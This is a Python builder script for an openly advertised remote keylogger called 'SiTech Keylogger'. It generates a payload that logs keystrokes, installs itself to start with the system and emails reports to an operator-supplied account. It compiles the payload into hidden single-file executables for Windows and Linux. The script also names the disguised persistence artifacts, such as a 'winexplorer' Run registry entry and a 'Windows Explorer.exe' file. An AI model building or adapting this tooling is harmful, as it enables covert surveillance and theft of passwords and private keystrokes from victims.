#!/usr/bin/env python
import argparse
import subprocess
import os
from colorama import Fore

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe")

print(Fore.RED + "")
print(" ____  _ _____         _       _  __          _")
print("/ ___|(_)_   _|__  ___| |__   | |/ /___ _   _| | ___   __ _  __ _  ___ _ __")
print("\___ \| | | |/ _ \/ __| '_ \  | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|")
print (" ___) | | | |  __/ (__| | | | | . \  __/ |_| | | (_) | (_| | (_| |  __/ |")
print("|____/|_| |_|\___|\___|_| |_| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|", "  v 1.0")
print("                                        |___/         |___/ |___/", "       [+] Made By AWPSN [+]")
print(Fore.RESET + "")
print(Fore.GREEN + "Our WebSite: https://sitechsecurity.wordpress.com", "=====", "Our Telegram Group: https://t.me/joinchat/Q8GANUSWgX7er-V13PVUog")
print(Fore.RESET + "")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.RED + "                                Keylogger Features")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.GREEN + "   1. Logs keys pressed on keyboard.")
print("   2. Starts with system startup.")
print("   3. Sends reports by email.")
print("   4. Works with Linux and Windows.")
print("   5. Does not require root or admin privileges.")
print(Fore.RESET + "")

def get_arguments():
    parser = argparse.ArgumentParser(description=' SiTech Keylogger V 1.0 | Remote persistent keylogger for Windows and Linux.')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()

def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("sitechlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("sitechlogger.become_persistent()\n")
        file.write("sitechlogger.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()
create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)

if arguments.windows:
    compile_for_windows(arguments.out)

if arguments.linux:
    compile_for_linux(arguments.out)

print("")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.RED + "                                  Important Notice")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.GREEN + "  [***] Turn on less secure applications in your Gmail account.")
print("  Use the link to do https://myaccount.google.com/lesssecureapps")
print(Fore.RED + "  [+] If you want this keylogger on your own computer, Please Use RDP or Virtual Computer.")
print(Fore.RESET + "")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.RED + "      Use Following Instructions For Remove Keylogger From Windows System")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.GREEN + "   1. Go to star, type regedit and run the first program, this will open the registry editor.")
print("   2. Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.")
print("   3. There should be an entry called winexplorer, right click this entry and select Delete.")
print("   4. Go to your user path > AppData > Roaming, You’ll see a file named “Windows Explorer.exe”, this is the keylogger, Right Click > Delete.")
print("   5. Restart Computer.")
print(Fore.RESET + "")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.RED + "      Use Following Instructions For Remove Keylogger From Linux System")
print(Fore.BLUE + "[+]============================================================================[+]")
print(Fore.GREEN + "    1. Open your Terminal")
print("    2. Type  cd .config/autostart")
print("    3. Run this command rm xinput.desktop")
print("    4. Restart th computer.")
print(Fore.RESET + "")
